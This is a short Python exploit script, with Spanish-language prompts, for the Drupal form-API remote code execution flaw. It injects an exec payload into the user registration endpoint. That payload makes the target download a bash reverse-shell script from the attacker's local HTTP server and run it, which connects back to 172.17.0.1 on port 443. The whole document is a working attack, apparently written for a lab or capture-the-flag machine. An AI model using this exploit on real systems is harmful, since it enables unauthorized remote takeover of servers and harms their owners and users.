import sys
import requests
import subprocess
import os
import time

print('\033[1;31mAntes de poner la ip debe escuchar por el puerto 443 con netcat\033[0m')

os.system('echo "#!/bin/bash" > shell && echo "bash -i >& /dev/tcp/172.17.0.1/443 0>&1" >> shell')
server_process = subprocess.Popen(['python3', '-m', 'http.server', '9090'])


print("El servidor HTTP está corriendo en segundo plano en el puerto 9090.")
print('\n')
time.sleep(3)
target = input('Ingresa la ip de la máquina victima: ')

url = 'http://' + target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'curl "172.17.0.1:9090/shell" -o shell; chmod +x shell; ./shell'}

r = requests.post(url, data=payload)

server_process.terminate()
print("El servidor HTTP ha sido detenido.")
os.system('rm shell')
